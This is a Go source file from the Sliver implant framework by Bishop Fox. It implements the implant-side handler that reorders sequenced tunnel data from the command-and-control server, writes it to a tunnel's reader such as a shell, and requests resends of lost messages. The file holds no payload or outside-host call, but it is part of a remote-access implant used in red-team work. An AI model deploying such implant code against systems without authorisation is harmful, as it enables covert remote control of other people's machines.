package tunnel_handlers

/*
	Sliver Implant Framework
	Copyright (C) 2022  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func TunnelDataHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
	tunnelData := &sliverpb.TunnelData{}
	proto.Unmarshal(envelope.Data, tunnelData)
	tunnel := connection.Tunnel(tunnelData.TunnelID)
	if tunnel != nil {
		// Since we have no guarantees that we will receive tunnel data in the correct order, we need
		// to ensure we write the data back to the reader in the correct order. The server will ensure
		// that TunnelData protobuf objects are numbered in the correct order using the Sequence property.
		// Similarly we ensure that any data we write-back to the server is also numbered correctly. To
		// reassemble the data, we just dump it into the cache and then advance the writer until we no longer
		// have sequential data. So we can receive `n` number of incorrectly ordered Protobuf objects and
		// correctly write them back to the reader.

		// {{if .Config.Debug}}
		log.Printf("[tunnel] Cache tunnel %d (seq: %d)", tunnel.ID, tunnelData.Sequence)
		// {{end}}

		tunnelDataCache.Add(tunnel.ID, tunnelData.Sequence, tunnelData)

		// NOTE: The read/write semantics can be a little mind boggling, just remember we're reading
		// from the server and writing to the tunnel's reader (e.g. stdout), so that's why ReadSequence
		// is used here whereas WriteSequence is used for data written back to the server

		// Go through cache and write all sequential data to the reader
		for recv, ok := tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()); ok; recv, ok = tunnelDataCache.Get(tunnel.ID, tunnel.ReadSequence()) {
			// {{if .Config.Debug}}
			log.Printf("[tunnel] Write %d bytes to tunnel %d (read seq: %d)", len(recv.Data), recv.TunnelID, recv.Sequence)
			// {{end}}
			tunnel.Writer.Write(recv.Data)

			// Delete the entry we just wrote from the cache
			tunnelDataCache.DeleteSeq(tunnel.ID, tunnel.ReadSequence())
			tunnel.IncReadSequence() // Increment sequence counter

			// {{if .Config.Debug}}
			log.Printf("[message just received] %v", tunnelData)
			// {{end}}
		}

		//If cache is building up it probably means a msg was lost and the server is currently hung waiting for it.
		//Send a Resend packet to have the msg resent from the cache
		if tunnelDataCache.Len(tunnel.ID) > 3 {
			data, err := proto.Marshal(&sliverpb.TunnelData{
				Sequence: tunnel.WriteSequence(), // The tunnel write sequence
				Ack:      tunnel.ReadSequence(),
				Resend:   true,
				TunnelID: tunnel.ID,
				Data:     []byte{},
			})
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[shell] Failed to marshal protobuf %s", err)
				// {{end}}
			} else {
				// {{if .Config.Debug}}
				log.Printf("[tunnel] Requesting resend of tunnelData seq: %d", tunnel.ReadSequence())
				// {{end}}
				connection.RequestResend(data)
			}
		}

	} else {
		// {{if .Config.Debug}}
		log.Printf("[tunnel] Received data for nil tunnel %d", tunnelData.TunnelID)
		log.Printf("[message just transfered] %v", tunnelData)
		// {{end}}
	}
}
